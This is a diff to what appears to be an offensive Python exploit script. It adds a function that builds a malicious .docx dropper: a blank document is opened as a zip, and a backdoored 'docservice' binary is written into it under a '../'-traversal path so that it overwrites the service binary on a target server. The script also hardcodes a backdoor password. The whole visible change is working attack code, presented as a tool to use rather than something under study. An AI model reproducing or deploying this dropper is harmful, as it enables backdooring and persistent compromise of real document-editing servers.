@@ -3,7 +3,7 @@
 
 import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback, jwt, shutil
 from urllib.parse import urlparse, parse_qs
-import concurrent.futures
+from zipfile import ZipFile
 
 bdpassword = 'BcogExx7Hsmrti'
 
@@ -66,7 +66,9 @@ def sign_url( url, secret ):
 # Generate a docx dropper for a backdoored docservice bin
 def generate_backdoor( docservicepath, password, version, traversedepth ):
   # Create build dir
-  builddir = os.path.dirname(__file__) + '/build'
+  scriptdir = os.path.dirname(__file__)
+  builddir = scriptdir + '/build'
+  dsbin = scriptdir + '/bin/docservice'
   if not os.path.isdir( builddir ):
     shutil.makedirs( builddir )
 
@@ -76,9 +78,22 @@ def generate_backdoor( docservicepath, password, version, traversedepth ):
   # Insert backdoor code into JS
   # npm install all dependencies
   # pkg to `docservice`
+  
   # Copy blank docx
+  docsdir = scriptdir + '/docs'
+  docfile = docsdir + '/backdoor.docx'
+  shutil.copy( docsdir + '/blank.docx', docfile )
+
   # Open as zip
-  # Write path traversal + docservice
+  zipObj = ZipFile( docfile,'a')
+  root = '../' * traversedepth
+  path = root + docservicepath
+  with open( dsbin, 'rb' ) as f:
+    
+    # Write path traversal + docservice
+    zipObj.writestr( path , f.read() )
+  zipObj.close()
+
   return
 
 class WsClient():
